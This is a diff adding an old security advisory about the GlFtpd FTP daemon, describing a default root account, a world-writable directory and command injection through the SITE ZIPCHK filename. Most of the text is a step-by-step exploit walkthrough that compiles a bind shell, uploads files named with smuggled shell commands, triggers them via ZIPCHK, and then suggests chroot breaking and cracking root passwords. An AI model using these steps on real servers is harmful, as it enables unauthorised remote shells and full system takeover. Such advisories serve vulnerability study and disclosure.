@@ -1,0 +1,80 @@
+source: http://www.securityfocus.com/bid/891/info
+
+GlFtpd is a popular alternative to the mainstream unix ftp daemons and is currently in wide use on the internet. There are three known serious vulnerabilities in GlFtpd. The first problem is an account which is created by default upon installation of the software. The username and password for this account are both "gltftpd" and the uid is 0 (root). This account can only be used by users connecting from localhost. This is a problem because "local users" can log into a host's glftpd with root privileges (and compromise the entire system). The second problem is world writeable ~/site directory. The last problem is the possibility to execute arbitrary commands on the target host. Glftpd comes with a feature called ZIPCHK, which is a command sent to the ftpd to check the integrity of a zip file on the server remotely. ZIPCHK executes "unzip" on the file without validating the filename input. With a special filename such as " ; ls", it is possible to execute arbitrary commands as the uid of glftpd. 
+
+Exploit Information:
+
+	1) & 2) are traditionally bad. Problems are obvious. 
+
+	3) This is quite simple a user need only have some place to upload files:
+
+		- You will need to build some kind of backdoor to allow you access, using bindshell.c (again)
+
+		$ gcc bindshell.c -o b -static
+	
+		- Create an empty file called " ; bash blah;"
+		- Create an empty file called " ; unzip blah;"
+
+		$ > " ; bash blah;"		
+
+		- Create a script called "blah" : 
+
+		$ cat > blah
+		#!/bin/bash
+		./b &
+		^D
+
+		- "ZIP" these files up. 
+		
+		$ zip blah.zip blah b
+
+		- Login to your FTP server. Now upload your files:
+
+		ftp> put blah.zip
+		ftp> put " ; bash blah;"
+		ftp> put " ; unzip blah.zip;"
+
+		- Because glFtpD attempts to convert spaces in filenames to underscores, youll need to rename
+		  them back.
+	
+		ftp> quote rnfr "_;_bash_blah;"
+		ftp> quote rnto " ; bash blah;"
+		ftp> quote rnfr "_;_unzip_blah.zip;"
+		ftp> quote rnto " ; unzip blah.zip;"
+
+		- Now run a ZIPCHK on the unzip one:
+
+		ftp> quote SITE ZIPCHK " ; unzip blah.zip;"
+		
+		- Hurray, now do a few ls commands till you get a file listing. Now run:
+
+		ftp> quote SITE ZIPCHK " ; bash blah;"
+
+		- glFtpD will spit out an error message. Ignore it. Now telnet to the port defined within
+		  bindshell.c.
+
+		- Once your on. If you attacked the glftpd account (or any uid = 0 account), you may now use simple chroot()
+		  breaking techniques (http://www.suid.kg/source/breakchroot.c) to have run of the entire box.
+
+		- If you did not have a uid == 0 account. Youll probably be in a chroot environment and you 
+		  dont really have a way out except to:
+
+			- check /etc/passwd (really $GLFTPDHOME/etc/passwd)
+			- Crack a uid == 0 passwd, maybe the glftpd account is still in there
+			- Use your imagination.
+
+
+Working Papers:
+
+	See the spectacle at http://www.suid.kg/advisories/003_wp.txt
+
+Links:
+	www.glftpd.org				-	Glftpd Home page
+	www.suid.kg/source/bindshell.c		-	bindshell.c
+	www.suid.kg/advisories/003_wp.txt	-	Example attack
+
+Greets:
+
+		^moo^, yowie, cr, duke, silvio, n1ck,
+		w00w00, and last but not least ADM
+
